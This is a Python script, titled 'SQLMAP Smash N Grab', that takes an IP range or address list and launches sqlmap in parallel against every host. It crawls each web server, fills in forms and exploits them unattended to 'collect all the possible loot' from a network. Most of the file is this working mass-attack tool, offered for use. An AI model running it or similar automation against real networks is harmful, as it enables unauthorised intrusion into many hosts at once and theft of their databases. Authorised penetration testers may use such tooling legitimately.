#!/usr/bin/env python3
### SQLMAP Smash N Grab script.
# Remember - this script is gonna be VERY loud
# use it to quickly collect all the possible loot in a given network

import logging
import os
import random
import string
from datetime import datetime
from subprocess import STDOUT
from subprocess import call as run
from threading import Thread
from time import sleep

THREAD_POOL_EXHAUSTED_LIMIT = 10
SLEEP_TIMER_IN_SECONDS = 10
DEFAULT_OUTPUT_DIRECTORY = 'async-sqlmap'
DEFAULT_SCRIPT_THREAD_POOL_EXHAUSTED_LIMIT = 10
DEFAULT_SLEEP_TIMER_IN_SECONDS = 60
DEFAULT_SQLMAP_THREADS_LIMIT = 10
logging.basicConfig(format='[%(asctime)s %(levelname)s] - %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level='INFO')


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(
        description='Use this tool to recursively crawl the web-servers in a given network with the sqlmap.')
    parser.add_argument('--ip-range', dest='ip_range', required=False,
                        help='An IP range of the class C network to recursively crawl by the sqlmap. Should have /24 suffix')
    parser.add_argument('--ip-file',
                        dest='ip_file',
                        required=False,
                        help='A txt file with a new line separated list of IP addresses.')
    parser.add_argument('--threads',
                        dest='threads',
                        default=DEFAULT_SCRIPT_THREAD_POOL_EXHAUSTED_LIMIT,
                        required=False,
                        help='A number of threads to use in script to scan hosts in parallel. Default is ' + str(
                            DEFAULT_SCRIPT_THREAD_POOL_EXHAUSTED_LIMIT) + ". Keep in mind that this limit is "
                                                                          "different than a number of the actual"
                                                                          " SQLMap threads. "
                                                                          "The number of SQLMAP threads is " + str(
                            DEFAULT_SQLMAP_THREADS_LIMIT))
    options = parser.parse_args()
    if not options.ip_range and not options.ip_file:
        parser.error('Either an IP range or a file with IP addresses must be given')
    return options


def read_ip_addresses(file_name):
    with open(file_name, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


def crawl_with_sqlmap_on_ip(ip_address):
    logging.info('[{ip}] Starting a new job'.format(ip=ip_address))
    try:
        run(['sqlmap',
             '--user-agent=SQLMAP',
             '--timeout=10',
             '--retries=2',
             '--batch',
             '--crawl=10',
             '--threads=5',
             '--forms',
             '--url',
             'http://{ip}'.format(ip=ip_address),
             '--output-dir',
             ip_address,
             '-v',
             '0',
             ],
            # https://stackoverflow.com/a/11269627
            stdout=open(os.devnull, 'w'),
            stderr=STDOUT)
        logging.info('[{ip}] Job has been finished'.format(ip=ip_address))
    except Exception as e:
        logging.error('[{ip}] {exception}'.format(ip=ip_address, exception=e))


class JobThread:
    def __init__(self, target_function, target_function_args=None):
        assert target_function, "Function to run within the thread must be given"
        random_uid = ''.join([random.choice(string.ascii_letters
                                            + string.digits) for n in range(15)])
        self.uid = "THREAD-{uid}".format(uid=random_uid)
        self.thread = Thread(target=target_function, args=target_function_args)

    def start(self):
        self.thread.start()

    def isAlive(self):
        return self.thread.isAlive()


def create_parallel_jobs(jobs_list,
                         thread_limit=THREAD_POOL_EXHAUSTED_LIMIT,
                         sleep_timer_in_seconds=SLEEP_TIMER_IN_SECONDS):
    threads = []
    for ip in jobs_list:
        while len(threads) >= thread_limit:
            logging.warning('Thread pool is exhausted, will sleep for {sleep} seconds and continue...'.format(
                sleep=sleep_timer_in_seconds))
            sleep(sleep_timer_in_seconds)
            for thread in threads.copy():
                if not thread.isAlive():
                    threads.remove(thread)
        try:
            thread = JobThread(target_function=crawl_with_sqlmap_on_ip, target_function_args=(ip,))
            thread.start()
            threads.append(thread)
        except Exception as e:
            logging.error('{exception}'.format(exception=e))

    while any(thread.isAlive() for thread in threads):
        logging.warning('\nNot all threads have finished yet, putting the main thread to sleep for {sleep} seconds'
                        .format(datetime=str(datetime.now()), sleep=sleep_timer_in_seconds))
        sleep(sleep_timer_in_seconds)
    logging.info('All threads have been finished')


def __main__():
    try:
        options = get_arguments()
        if options.ip_file:
            ip_addresses = read_ip_addresses(options.ip_file)
        elif options.ip_range:
            ip_addresses = []
            chunks = options.ip_range.split('.')
            for i in range(int(chunks[3].split('/')[0]), 255):
                ip_addresses.append("{}.{}.{}.{}".format(chunks[0], chunks[1], chunks[2], str(i)))
        else:
            ip_addresses = []
        create_parallel_jobs(ip_addresses, int(options.threads))
    except Exception as e:
        print(e)
    print('Killing all instances of SQLMap before exit...')
    run(['killall', 'sqlmap'])


if '__main__' == __name__:
    __main__()
